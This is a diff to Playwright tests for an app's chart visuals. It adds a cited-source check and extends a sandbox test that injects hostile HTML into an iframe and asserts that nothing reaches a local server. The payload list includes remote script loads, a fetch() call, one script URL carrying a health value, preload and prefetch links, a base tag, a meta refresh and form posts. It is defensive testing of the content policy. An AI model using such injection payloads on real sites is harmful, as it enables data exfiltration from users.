@@ -93,8 +93,15 @@ test("a visual draws in the reply in Rufi's theme at its own height, doesn't rel
   // The reply streams in small parts: the text after the visual goes on
   // after the visual draws.
   const more = "These are the values your record keeps. ".repeat(15);
-  const after = `${more}halfway. ${more}trickle end.`;
-  await send(page, withVisual(chart, after));
+  // A source cited before the visual, defined at the reply's end.
+  const after = `${more}halfway. ${more}trickle end.\n\n[lab]: rufi:/documents/fictional-doc`;
+  await send(
+    page,
+    withVisual(chart, after).replace(
+      "Your HbA1c, drawn:",
+      "Your HbA1c, drawn ([Sunrise Labs][lab]):",
+    ),
+  );
   const card = cards(page);
   const inside = page.frameLocator(".reply iframe[title='Visual']");
   await expect(inside.locator("circle")).toBeVisible();
@@ -127,8 +134,12 @@ test("a visual draws in the reply in Rufi's theme at its own height, doesn't rel
   // The block shows as the visual, not as its code.
   await expect(log(page).locator(".reply pre")).toHaveCount(0);
   await expect(
-    log(page).locator(".reply").getByText("Your HbA1c, drawn:"),
+    log(page).locator(".reply").getByText("Your HbA1c, drawn"),
   ).toBeVisible();
+  // The reply is one document: the source is a link.
+  await expect(
+    log(page).locator(".reply").getByRole("link", { name: "Sunrise Labs" }),
+  ).toHaveAttribute("href", /\/documents\/fictional-doc$/);
 
   // Dark: the same document takes the new colours.
   const light = await ink();
@@ -169,26 +180,47 @@ test("a visual runs no script of its own and reaches neither the network nor Ruf
   page,
   rufi,
 }) => {
+  // Also in WebKit (the iPhone's engine), whose link hints connect whatever
+  // a policy says.
   // Anything that reaches here got out, whatever it was.
   const reached: string[] = [];
   const outside: Server = createServer((request, response) => {
     reached.push(request.url ?? "");
     response.end("out");
   });
+  // A connection counts, even one that never sends a request.
   outside.on("connection", () => reached.push("a connection"));
   await new Promise<void>((resolve) => outside.listen(0, "127.0.0.1", resolve));
   const out = `http://127.0.0.1:${String((outside.address() as AddressInfo).port)}`;
   try {
     await opened(page, rufi);
+    // The page's own script, whose hash the policy allows.
+    const response = await page.request.get(
+      new URL("/visual-frame.html", page.url()).href,
+    );
+    const own = /'(sha256-[^']+)'/.exec(
+      response.headers()["content-security-policy"] ?? "",
+    )?.[1];
+    expect(own).toBeDefined();
     const hostile = [
       '<p id="drawn">Drawn</p>',
       // As a model writes a chart: a library from a CDN, then its script.
       `<script src="${out}/chart.js"></script>`,
+      // A file named by a hash the policy allows: its request would leave
+      // before the file is checked.
+      `<script src="${out}/values.js?hba1c=6.4" integrity="${own ?? ""}" crossorigin="anonymous"></script>`,
+      `<svg><script href="${out}/drawn.js"></script></svg>`,
       `<script>document.body.dataset.ran = "yes"; fetch(${JSON.stringify(out)} + "/fetch");</script>`,
       '<img alt="" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onload="document.body.dataset.handler = \'yes\'">',
       `<img src="${out}/picture.png" alt="">`,
       `<link rel="stylesheet" href="${out}/style.css">`,
       `<link rel="prefetch" href="${out}/prefetch">`,
+      `<link rel="preconnect" href="${out}">`,
+      `<link rel="dns-prefetch" href="${out}">`,
+      `<link rel="preload" as="script" href="${out}/preloaded.js" integrity="${own ?? ""}">`,
+      `<object data="${out}/object"></object><embed src="${out}/embed">`,
+      `<base href="${out}/">`,
+      `<meta http-equiv="refresh" content="0;url=${out}/moved">`,
       `<style>@import url("${out}/imported.css"); #drawn { background: url("${out}/background.png"); }</style>`,
       `<iframe src="${out}/framed"></iframe>`,
       `<form action="${out}/form" method="post"><button id="post">Post</button></form>`,
@@ -231,24 +263,7 @@ test("a visual runs no script of its own and reaches neither the network nor Ruf
     // A form or a link in it goes nowhere.
     await inside.locator("#post").click();
     await inside.locator("#away").click();
-
-    // Nor can it take itself somewhere else.
-    await send(
-      page,
-      withVisual(`<meta http-equiv="refresh" content="0;url=${out}/moved">`),
-    );
-    await expect(cards(page)).toHaveCount(2);
-    // One that loads itself again and again stops, and says so.
-    await send(
-      page,
-      withVisual(
-        '<meta http-equiv="refresh" content="0;url=/visual-frame.html">',
-      ),
-    );
-    await expect(
-      log(page).getByText("Part of this visual didn't load"),
-    ).toHaveCount(2);
-    await page.waitForTimeout(500);
+    await page.waitForTimeout(1000);
 
     expect(reached).toEqual([]);
     expect(page.context().pages()).toHaveLength(1);
